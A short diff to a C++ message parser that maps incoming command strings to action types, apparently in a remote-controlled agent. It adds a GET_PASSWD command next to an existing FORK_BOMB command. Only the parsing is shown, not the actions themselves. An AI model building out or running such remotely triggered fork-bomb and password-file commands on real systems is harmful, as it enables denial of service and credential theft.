@@ -44,6 +44,8 @@ ActionInfo MessageParser::parseMessage(std::string receivedMessage, const char* 
         actionType = ActionType::REPORT;
     } else if (GeneralUtils::cStrAreEqual(strActionType, "FORK_BOMB")) {
         actionType = ActionType::FORK_BOMB;
+    } else if (GeneralUtils::cStrAreEqual(strActionType, "GET_PASSWD")) {
+        actionType = ActionType::GET_PASSWD;
     } else {
         actionType = ActionType::UNKNOWN;
     }
